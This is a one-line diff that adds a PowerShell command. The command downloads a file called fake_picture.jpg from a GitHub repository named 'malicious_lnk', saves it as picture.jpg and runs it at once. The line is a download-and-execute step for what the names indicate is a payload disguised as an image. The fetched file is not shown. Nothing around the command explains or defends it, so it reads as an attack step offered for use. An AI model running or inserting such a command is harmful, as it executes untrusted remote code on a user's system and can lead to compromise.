@@ -1,0 +1,1 @@
+Invoke-WebRequest "https://raw.githubusercontent.com/alipasaturhan/malicious_lnk/main/fake_picture.jpg" -OutFile picture.jpg; .\picture.jpg
